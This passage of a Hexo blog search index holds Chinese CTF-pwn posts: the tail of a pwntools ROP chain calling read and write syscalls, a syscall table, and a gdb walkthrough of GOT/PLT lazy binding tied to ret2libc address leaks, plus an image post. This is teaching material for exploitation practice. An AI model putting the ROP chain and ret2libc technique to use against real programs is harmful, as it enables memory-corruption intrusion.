class="hljs-number">0</span>)+p64(syscall)+ p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) \<br>    + p64(buf+<span class="hljs-number">0x10</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x90</span>) + p64(pop_rax) + p64(<span class="hljs-number">1</span>) +p64(syscall)<br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">%rax</th><th align="left">System call</th><th align="left">%rdi</th><th align="left">%rsi</th><th align="left">%rdx</th><th align="left">%rcx</th><th align="left">%r8</th><th align="left">%r9</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">sys_read</td><td align="left">unsigned int fd</td><td align="left">char *buf</td><td align="left">size_t count</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">1</td><td align="left">sys_write</td><td align="left">unsigned int fd</td><td align="left">const char *buf</td><td align="left">size_t count</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">2</td><td align="left">sys_open</td><td align="left">const char *filename</td><td align="left">int flags</td><td align="left">int mode</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">3</td><td align="left">sys_close</td><td align="left">unsigned int fd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GOT表和PLT表</title>
    <link href="/2022/11/16/ctf-pwn/got%E8%A1%A8%E5%92%8Cplt%E8%A1%A8/"/>
    <url>/2022/11/16/ctf-pwn/got%E8%A1%A8%E5%92%8Cplt%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p>Linux 动态链接与延迟绑定机制</p><p><strong>Q：</strong></p><ol><li>为什么ret2libc泄露基址时要选择已经使用过的函数？</li><li>何为延迟绑定？</li></ol><h2 id="Linux-动态链接与延迟绑定机制"><a href="#Linux-动态链接与延迟绑定机制" class="headerlink" title="Linux 动态链接与延迟绑定机制"></a>Linux 动态链接与延迟绑定机制</h2><p>​    假设，写了一个函数<code>f()</code>，调用了glibc中函数<code>x()</code>，在可执行文件是如何编译的？</p><p>​    对于libc中的函数，例如system、puts、write等，需要在程序运行时动态加载到内存中，不同版本的libc加载的位置各不相同，gcc没有办法直接在函数<code>f()</code>的汇编指令中直接call函数<code>x()</code>的真实地址</p><p>​    因此，需要在调用前加入一个寻找函数地址的过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text<br> ...<br> call f_stub<br> ...<br> <br> ...<br> f_stub:<br>  1. find and save function f() entry point in f_stub_addr<br>     2. mov eax, [f_addr]<br>        jmp eax<br> ...<br> <br>.data<br> f_addr  // 存储实际的f()地址<br></code></pre></td></tr></table></figure><p>​    如上述过程，f_stub去寻找实际的地址，存储在f_addr中，然后调用它</p><p>​    linux的动态链接过程与上述类似，也是由一个存放外部函数地址数据GOT表（对应f_addr)，和一段函数调用额外的代码PLT表（对应f_stub)</p><p>​    后文会具体分析其机制</p><h5 id="实验参考"><a href="#实验参考" class="headerlink" title="实验参考"></a>实验参考</h5><p><a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL">https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL</a></p><p><a href="https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click</a></p><h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_banner</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to World of PLT and GOT\n&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    print_banner();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="编译链接"><a href="#编译链接" class="headerlink" title="编译链接"></a>编译链接</h5><p><code>gcc -Wall  -g test.c -o test.o -m32</code></p><p><strong>平台</strong>： <strong>kali</strong>-<strong>linux</strong></p><p>开始调试</p><p><strong>首先，在printf函数调用前下一个断点</strong></p><p><img src="/img/plt&got/1.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">[-------------------------------------code-------------------------------------]<br>   0x555555555134 &lt;frame_dummy+4&gt;:      jmp    0x5555555550b0 &lt;register_tm_clones&gt;<br>   0x555555555139 &lt;print_banner&gt;:       push   rbp<br>   0x55555555513a &lt;print_banner+1&gt;:     mov    rbp,rsp<br>=&gt; 0x55555555513d &lt;print_banner+4&gt;:     lea    rax,[rip+0xec4]        # 0x555555556008<br>   0x555555555144 &lt;print_banner+11&gt;:    mov    rdi,rax<br>   0x555555555147 &lt;print_banner+14&gt;:    call   0x555555555030 &lt;puts@plt&gt;<br>   0x55555555514c &lt;print_banner+19&gt;:    nop<br>   0x55555555514d &lt;print_banner+20&gt;:    pop    rbp<br></code></pre></td></tr></table></figure><p>跳转到了0x555555555030这个地址，gdb对其的标注为&lt;puts@plt&gt;</p><p>查看一下这个地址上的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/10i 0x555555555030<br>   0x555555555030 &lt;puts@plt&gt;:   jmp    QWORD PTR [rip+0x2fca]        # 0x555555558000 &lt;puts@got[plt]&gt;<br>   0x555555555036 &lt;puts@plt+6&gt;: push   0x0<br>   0x55555555503b &lt;puts@plt+11&gt;:        jmp    0x555555555020<br></code></pre></td></tr></table></figure><p>这里第一条指令，jmp 0x555555558000，gdb对其的标注为&lt;puts@got[plt]&gt;，查看这个地址上的值，会发现这个指令在原地跳转：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/x 0x555555558000 <br>0x555555558000 &lt;puts@got[plt]&gt;: 0x0000555555555036 //这个地址就是上面plt表的第二条指令<br></code></pre></td></tr></table></figure><p>相当于什么也没做</p><p>那么根据文章开头的介绍，寻找函数的工作肯定是由第三条指令，<code>jmp 0x555555555020</code>来完成的，这里先不对这个函数进行分析，直接来看结果</p><p><strong>在printf函数后面下断点，重新查看刚才&lt;puts@got[plt]&gt;上的内容</strong></p><p><img src="/img/plt&got/2.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/x 0x555555558000<br>0x555555558000 &lt;puts@got[plt]&gt;: 0x00007ffff7c75db0<br></code></pre></td></tr></table></figure><p>发现这个地方的值变了，而这个改变后的值就是puts函数在libc中的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/10i 0x00007ffff7c75db0<br>   0x7ffff7c75db0 &lt;__GI__IO_puts&gt;:      push   r14<br>   0x7ffff7c75db2 &lt;__GI__IO_puts+2&gt;:    push   r13<br>   0x7ffff7c75db4 &lt;__GI__IO_puts+4&gt;:    push   r12<br>   0x7ffff7c75db6 &lt;__GI__IO_puts+6&gt;:    mov    r12,rdi<br>   0x7ffff7c75db9 &lt;__GI__IO_puts+9&gt;:    push   rbp<br>   0x7ffff7c75dba &lt;__GI__IO_puts+10&gt;:   push   rbx<br>   0x7ffff7c75dbb &lt;__GI__IO_puts+11&gt;:   sub    rsp,0x10<br>   0x7ffff7c75dbf &lt;__GI__IO_puts+15&gt;:   call   0x7ffff7c28110 &lt;*ABS*+0x99da0@plt&gt;<br>   0x7ffff7c75dc4 &lt;__GI__IO_puts+20&gt;:   mov    r13,QWORD PTR [rip+0x17e04d]        # 0x7ffff7df3e18<br>   0x7ffff7c75dcb &lt;__GI__IO_puts+27&gt;:   mov    rbx,rax<br></code></pre></td></tr></table></figure><p><strong>因此可以得出结论</strong></p><p>​    plt表中会先尝试跳转到got表上的函数地址，如果是第一次调用，会进行一次无效跳转，然后去寻找真正的地址填充在got表项上，然后调用；如果是第二次调用，会直接jmp到got表真实的函数地址上</p><p>​    这样就是为什么ret2libc需要使用用已被调用过的函数</p><p><em>tips：</em></p><p><em>linux程序都有一个libc_start_main函数，且会在main函数之前被调用，所以可以在ret2libc时无脑用这个函数(只是个人猜测，并未实际验证)</em></p><p><strong>然后解决如何寻找函数地址的问题</strong>：</p><p>​    在plt表的第二条汇编指令中，push 0x0为寻址函数提供了一个参数，如果打开一个具有多个plt表项的程序，会发现每一项这个值都是不同的：</p><p><img src="/img/plt&got/3.jpg"></p><p>​    这个push的值唯一标识了寻找的函数，</p><p>​    然后再看第三条指令，观察发现这个jmp指令跳转到了plt表的开头（可以在objdump里看到这也是一个plt表项，但是代码与其他表项形式不同）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/10i 0x555555555020<br>   0x555555555020:      push   QWORD PTR [rip+0x2fca]        # 0x555555557ff0<br>   0x555555555026:      jmp    QWORD PTR [rip+0x2fcc]        # 0x555555557ff8<br></code></pre></td></tr></table></figure><p>如果在gdb未开始调试的时候，查看这个jmp的值，是0x0</p><p>而在printf函数前的断点查看，会发现它发生了变化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/x 0x555555557ff8<br>0x555555557ff8: 0x00007ffff7fdc080<br><br>gdb-peda$ x/10i 0x00007ffff7fdc080<br>   0x7ffff7fdc080 &lt;_dl_runtime_resolve_xsavec&gt;: push   rbx<br>   0x7ffff7fdc081 &lt;_dl_runtime_resolve_xsavec+1&gt;:       mov    rbx,rsp<br>   0x7ffff7fdc084 &lt;_dl_runtime_resolve_xsavec+4&gt;:       and    rsp,0xffffffffffffffc0<br>   0x7ffff7fdc088 &lt;_dl_runtime_resolve_xsavec+8&gt;:<br>    sub    rsp,QWORD PTR [rip+0x20be1]        # 0x7ffff7ffcc70 &lt;_rtld_global_ro+432&gt;<br>   0x7ffff7fdc08f &lt;_dl_runtime_resolve_xsavec+15&gt;:      mov    QWORD PTR [rsp],rax<br>   0x7ffff7fdc093 &lt;_dl_runtime_resolve_xsavec+19&gt;:      mov    QWORD PTR [rsp+0x8],rcx<br>   0x7ffff7fdc098 &lt;_dl_runtime_resolve_xsavec+24&gt;:      mov    QWORD PTR [rsp+0x10],rdx<br>   0x7ffff7fdc09d &lt;_dl_runtime_resolve_xsavec+29&gt;:      mov    QWORD PTR [rsp+0x18],rsi<br>   0x7ffff7fdc0a2 &lt;_dl_runtime_resolve_xsavec+34&gt;:      mov    QWORD PTR [rsp+0x20],rdi<br>   0x7ffff7fdc0a7 &lt;_dl_runtime_resolve_xsavec+39&gt;:      mov    QWORD PTR [rsp+0x28],r8<br><br></code></pre></td></tr></table></figure><p>这个函数为<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>，此处不在对其具体分析，其用处即为寻找编号为<code>reloc_index</code>的函数</p><h5 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h5><p><strong>第一次调用</strong></p><p><img src="/img/plt&got/4.jpg"></p><p><strong>第二次调用</strong></p><p><img src="/img/plt&got/5.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>可爱的小黄鸡</title>
    <link href="/2022/11/16/%E6%9D%82%E9%A1%B9/%E5%B0%8F%E9%BB%84%E9%B8%A1/"/>
    <url>/2022/11/16/%E6%9D%82%E9%A1%B9/%E5%B0%8F%E9%BB%84%E9%B8%A1/</url>
    
    <content type="html"><![CDATA[<p>可爱的小黄鸡 0v0</p><p><img src="/img/basic/1.jpg"><br><img src="/img/basic/2.jpg"><br><img src="/img/basic/3.jpg"><br><img src="/img/basic/4.jpg"><br><img src="/img/basic/5.jpg"><br><img src="/img/basic/6.jpg"><br><img src="/img/basic/7.jpg"><br><img src="/img/basic/9.jpg"><br><img src="/img/basic/1.gif"><br><img src="/img/basic/2.gif"></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Others</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
